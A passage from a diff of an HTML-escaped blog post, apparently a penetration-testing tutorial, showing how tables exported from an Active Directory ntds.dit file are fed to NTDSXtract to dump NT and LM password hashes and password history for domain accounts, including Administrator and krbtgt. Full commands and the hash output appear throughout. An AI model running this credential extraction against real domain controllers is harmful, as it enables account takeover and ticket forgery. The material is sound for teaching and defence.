+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysUnicodeFixupVer2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;datatable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;hiddentable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;link_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sdpropcounttable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sdproptable&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;sd_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;MSysDefrag2&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;quota_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Exporting table &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;quota_rebuild_progress_table&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; out of 12.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Export completed.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Move the exported tables to somewhere a bit easier:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/libesedb-20120102/esedbtools# mv ntds.dit.export/ ../../
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;NTDS extract can do a lot more than just hashes:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog# cd NTDSXtract 1.0/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/NTDSXtract 1.0# ls
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;dscomputers.py  dsdeletedobjects.py  dsfileinformation.py  dsgroups.py  dstimeline.py  dsusers.py  framework  ntds
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;DSUsers
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Extracts information related to user objects
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;usage: dsusers.py   &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;option&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  options:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --rid 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          List user identified by RID
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --name 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          List user identified by Name
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --passwordhashes 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          Extract password hashes
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --passwordhistory 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          Extract password history
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --certificates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          Extract certificates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --supplcreds 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          Extract kerberos keys
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --membership
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;          List groups of which the user is a member
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/NTDSXtract 1.0# 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But we like hashes:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root@wpad:~/blog/NTDSXtract 1.0# python dsusers.py ../ntds.dit.export/datatable.3 ../ntds.dit.export/link_table.5 --passwordhashes ../SYSTEM.hive --passwordhistory ../SYSTEM.hive 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Running with options:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Extracting password hashes
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Extracting password history
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Initialising engine...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Scanning database - 100% -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3475&lt;/span&gt; records processed
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Extracting schema information - 100% -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1549&lt;/span&gt; records processed
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Extracting object links...
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;List of users:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==============&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3562&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           Administrator
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    Administrator
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: 7ceee337-fa58-4ca0-9643-540a40161020
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-500
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2012-08-22 03:12:59
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2013-05-15 04:06:55
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2012-08-22 02:49:42.899576
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           2013-05-15 04:08:04.547236
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: 2013-05-15 04:06:55.577353
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     2013-06-07 02:34:34.560516
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users Administrator 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Administrator:$NT$88e4d9fabaecf3ded18dd80905521b29:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3563&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           Guest
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    Guest
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: 659723d7-1246-4959-b0fc-af80ea5e3816
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-501
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2012-08-22 03:12:59
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2013-03-14 06:54:22
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2013-03-14 06:54:22.029303
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           2013-03-14 06:54:27.012817
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: 2013-03-14 06:32:41.834022
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     2013-06-07 03:07:46.499917
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	PWD Not Required
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	PWD Never Expires
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users Guest 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Guest:$NT$823893adfad2ada6e1a414f3ebdf58f7:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3564&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           user
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    user
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: c5a5c87a-93b4-4d80-97a1-1c605b9b0c03
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-1000
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2012-08-22 03:12:59
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2013-06-07 02:51:54
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2013-03-14 03:25:11.793912
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           2013-06-07 02:51:54.152191
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: 2013-06-07 02:51:54.152191
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     2013-04-19 05:25:40.412670
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	PWD Never Expires
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users user 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user:$NT$88e4d9fabaecf3dec18dd80905521b29:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user_nthistory0:$NT$88e4d9fabafcf3dec18dd80905521b29:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user_nthistory1:$NT$0c61031f010b2fbb88fe449fbf262477:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user_nthistory2:$NT$88e4dffabaecf3dec18dd80905521b29:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user_lmhistory0:c869027e01c3c4fe7626a90c87cc7fed:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	user_lmhistory1:8be023cd858da1edd21b94907afe182c:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3610&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           krbtgt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    krbtgt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: 74e6bd0b-e4d5-42df-98d5-24f9060061c9
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-502
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2012-08-22 03:16:03
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2012-08-22 03:31:13
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2012-08-22 03:16:03.166457
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           Never
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: Never
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     Never
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Disabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users krbtgt 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	krbtgt:$NT$7253e8647254716b507a2dcb149ff2da:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password history:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	krbtgt_nthistory0:$NT$7253e86a7254716a507a2dcb149ff2da:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	krbtgt_lmhistory0:113926e06a31d182623633041b632929:::
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Record ID:           &lt;span style=&#34;color:#ae81ff&#34;&gt;3762&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User name:           John Doe
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User principal name: jdoe@projectmentor.net
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account name:    jdoe
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SAM Account type:    SAM_NORMAL_USER_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GUID: bbf24c63-39a9-4cc4-8aa8-933f9ddee940
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;SID:  S-1-5-21-3825330677-773554443-1603823854-1104
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When created:         2012-08-22 04:10:52
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;When changed:         2013-06-05 13:04:11
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Account expires:      Never
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password last set:    2013-04-19 07:11:49.849592
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon:           2013-06-07 02:56:25.677855
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Last logon timestamp: 2013-06-05 13:04:11.674344
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password time     2013-05-02 03:01:12.536251
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Logon count:          &lt;span style=&#34;color:#ae81ff&#34;&gt;242&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Bad password count:   &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User Account Control:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	NORMAL_ACCOUNT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	PWD Never Expires
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Ancestors:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	$ROOT_OBJECT$ net projectmentor Users John Doe 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password hashes:
